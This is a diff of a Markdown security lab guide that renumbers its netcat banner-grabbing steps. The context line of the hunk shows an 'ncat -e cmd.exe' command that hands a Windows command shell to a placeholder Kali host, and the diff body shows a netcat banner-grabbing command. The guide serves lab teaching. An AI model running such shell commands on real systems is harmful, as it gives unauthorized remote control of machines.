@@ -178,12 +178,12 @@ ncat -e cmd.exe Kali-IP 1234
 2. To close the session, type `exit`
 
 <u>Banner Grabbing:</u>
-3. To get information on the service running on a certain port, run the following command:
+1. To get information on the service running on a certain port, run the following command:
 ```
 nc -v -b Win10-IP port_number
 ```
 
-4. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>
+2. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>
 
 ## Linux Vulnerabilities
 ### Connecting to a SSH Server and Disabling Remote Root Login using PuTTY
